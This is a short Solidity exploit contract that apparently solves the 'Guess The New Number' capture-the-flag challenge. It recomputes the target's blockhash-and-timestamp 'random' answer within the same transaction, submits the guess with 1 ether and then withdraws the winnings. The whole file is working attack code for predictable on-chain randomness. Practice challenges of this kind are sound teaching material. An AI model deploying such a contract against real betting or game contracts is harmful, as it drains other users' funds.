// SPDX-License-Identifier: No License
pragma solidity ^0.8.0;

interface IGuessTheNewNumberChallenge {
    function guess(uint8) external payable;
}


contract Exploit {
    IGuessTheNewNumberChallenge public GuessTheNewNumberChallenge;

    constructor(address _address) {
        GuessTheNewNumberChallenge = IGuessTheNewNumberChallenge(_address);
    }

    function guess() public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        GuessTheNewNumberChallenge.guess{value: 1 ether}(answer);
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
